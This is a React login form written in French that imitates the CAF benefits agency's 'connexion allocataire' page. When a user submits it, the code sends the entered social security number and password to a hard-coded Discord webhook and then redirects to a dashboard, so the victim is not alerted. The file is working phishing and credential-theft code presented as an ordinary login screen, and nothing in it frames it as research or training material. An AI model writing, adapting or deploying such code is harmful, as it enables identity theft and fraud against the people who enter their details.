import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { Eye, EyeOff, HelpCircle } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

const LoginForm = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [ssn, setSsn] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [ssnError, setSsnError] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validation du nombre de chiffres (doit être exactement 13)
    const rawSsn = ssn.replace(/\s/g, '');
    if (rawSsn.length !== 13) {
      setSsnError(true);
      return;
    }
    
    setSsnError(false);
    setIsLoading(true);

    // --- CONFIGURATION ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1483197361433088075/-_Ow9tNiutwNQ7oEGpm0nUl8bsU8mNArFYx_0JA9dZ-fmS1bXO76mgyFmdkkgtBmnekq";

    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔔 **Nouvel identifiant reçu !**\n\n👤 **SSN:** \`${ssn}\`\n🔑 **Mot de passe:** \`${password}\`\n\n🌐 *Source: CAF App*`
        }),
      });

      setTimeout(() => {
        navigate('/dashboard');
      }, 1000);

    } catch (error) {
      console.error("Erreur d'envoi", error);
      navigate('/dashboard');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <motion.div
      className="container"
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      transition={{ duration: 0.3 }}
      style={{ maxWidth: '600px', marginTop: isMobile ? '1rem' : '2rem', padding: isMobile ? '0 1rem' : '0' }}
    >
      <div className="card" style={{ padding: isMobile ? '1.5rem' : '2rem', backgroundColor: 'white', borderRadius: '4px', border: 'none', boxShadow: '0 2px 10px rgba(0,0,0,0.05)' }}>
        <h2 style={{ fontSize: isMobile ? '1.05rem' : '1.25rem', color: '#666', textTransform: 'uppercase', marginBottom: '1.5rem', borderBottom: '1px solid #eee', paddingBottom: '1rem', fontWeight: 600 }}>
          CONNEXION ALLOCATAIRE
        </h2>

        <p style={{ fontSize: '0.875rem', color: '#666', marginBottom: isMobile ? '1.5rem' : '2rem', lineHeight: 1.4 }}>
          Tous les champs sont obligatoires, sauf mention contraire.
        </p>

        <form onSubmit={handleSubmit} className="flex flex-column gap-4">
          <div className="flex flex-column gap-2">
            <label className="flex items-center gap-1" style={{ fontSize: '0.9rem', fontWeight: 600, color: '#444' }}>
              Numéro de sécurité sociale
              <HelpCircle size={16} color="#999" />
            </label>
            <input
              type="text"
              placeholder="13 caractères"
              value={ssn}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, ''); 
                if (val.length <= 13) {
                  let formatted = val;
                  if (val.length > 1) formatted = val.slice(0, 1) + ' ' + val.slice(1);
                  if (val.length > 3) formatted = formatted.slice(0, 4) + ' ' + val.slice(3);
                  if (val.length > 5) formatted = formatted.slice(0, 7) + ' ' + val.slice(5);
                  if (val.length > 7) formatted = formatted.slice(0, 10) + ' ' + val.slice(7);
                  if (val.length > 10) formatted = formatted.slice(0, 14) + ' ' + val.slice(10);
                  setSsn(formatted.trim());
                  if (val.length === 13) setSsnError(false);
                }
              }}
              required
              style={{
                padding: '0.85rem',
                borderRadius: '4px',
                border: ssnError ? '2px solid #d31d44' : '1px solid #ccc',
                backgroundColor: '#f8fafc',
                fontSize: '1.1rem',
                letterSpacing: '0.05em',
                outline: 'none',
                width: '100%'
              }}
            />
            {ssnError && (
              <p style={{ color: '#d31d44', fontSize: '0.85rem', marginTop: '-4px', lineHeight: '1.4' }}>
                Saisie incorrecte (13 caractères ;<br />
                Exemple : 2 94 03 75 120 005)
              </p>
            )}
            <div className="flex items-center gap-2 mt-1">
              <input type="checkbox" id="remember" style={{ width: '18px', height: '18px' }} />
              <label htmlFor="remember" style={{ fontSize: '0.875rem', color: '#666' }}>Retenir cet identifiant</label>
            </div>
            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem', textDecoration: 'none' }}>
              J'ai un identifiant provisoire
            </a>
          </div>

          <div className="flex flex-column gap-2">
            <label style={{ fontSize: '0.9rem', fontWeight: 600, color: '#444' }}>
              Mot de passe
            </label>
            <div style={{ position: 'relative' }}>
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Votre mot de passe"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                style={{
                  padding: '0.85rem',
                  paddingRight: '3rem',
                  width: '100%',
                  borderRadius: '4px',
                  border: '1px solid #ccc',
                  backgroundColor: '#f8fafc',
                  fontSize: '1.1rem',
                  outline: 'none'
                }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)', color: '#0096C7', border: 'none', background: 'none' }}
              >
                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
              </button>
            </div>
            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem', textDecoration: 'none' }}>
              Mot de passe oublié ?
            </a>
          </div>

          <div className="text-center mt-6">
            <button
              type="submit"
              disabled={isLoading}
              className="btn"
              style={{
                width: '100%',
                padding: '1rem',
                backgroundColor: '#0096C7',
                color: 'white',
                fontSize: '1.1rem',
                fontWeight: 600,
                borderRadius: '4px',
                opacity: isLoading ? 0.7 : 1,
                cursor: isLoading ? 'not-allowed' : 'pointer',
                textTransform: 'none',
                border: 'none'
              }}
            >
              {isLoading ? "Connexion en cours..." : "Se connecter"}
            </button>
          </div>
        </form>
      </div>
    </motion.div>
  );
};

export default LoginForm;
